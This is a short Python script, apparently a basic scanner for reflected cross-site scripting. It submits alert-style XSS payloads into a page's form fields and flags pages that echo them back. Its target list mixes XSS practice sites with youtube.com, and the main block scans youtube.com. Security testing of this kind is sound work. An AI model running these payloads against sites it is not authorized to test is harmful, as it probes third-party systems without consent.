from bs4 import BeautifulSoup
import requests
from urllib.parse import urljoin

def find_input_fields(html):
    soup = BeautifulSoup(html, "html.parser")
    return soup.find_all(['input', 'textarea', 'form'])

def input_field_details(form):
    details = {
        "action": form.attrs.get("action", "#"),
        "method": form.attrs.get("method", "get").lower(),
        "inputs": []
    }
    for input in form.find_all(['input', 'textarea']):
        input_details = {
            "type": input.attrs.get("type", "text"),
            "name": input.attrs.get("name", ""),
            "value": input.attrs.get("value", "")
        }
        details["inputs"].append(input_details)
    return details

def test_xss_injection(base_url, form, session):
    action = urljoin(base_url, form['action'])
    xss_payloads = [
        '<script>alert("XSS")</script>',
        '"><script>alert("XSS")</script>',
        '" onfocus="alert(\'XSS\')" autofocus="',
        'javascript:alert("XSS");'
    ]
    data = {}
    for input in form['inputs']:
        for payload in xss_payloads:
            data[input['name']] = payload
            if form['method'] == 'post':
                response = session.post(action, data=data)
            else:
                response = session.get(action, params=data)
            if payload in response.text:
                return True
    return False

def scan_xss_vulnerability(url):
    session = requests.Session()
    try:
        response = session.get(url)
        forms = find_input_fields(response.text)
        for form in forms:
            form_info = input_field_details(form)
            if test_xss_injection(url, form_info, session):
                print(f"XSS vulnerability detected")
    except requests.exceptions.RequestException as e:
        print(f"Error fetching the URL: {e}")

if __name__ == '__main__':
    url = ["https://xss-quiz.int21h.jp", "http://sudo.co.il/xss/level4.php","https://www.youtube.com"]  # Replace with the actual URL
    scan_xss_vulnerability(url[2])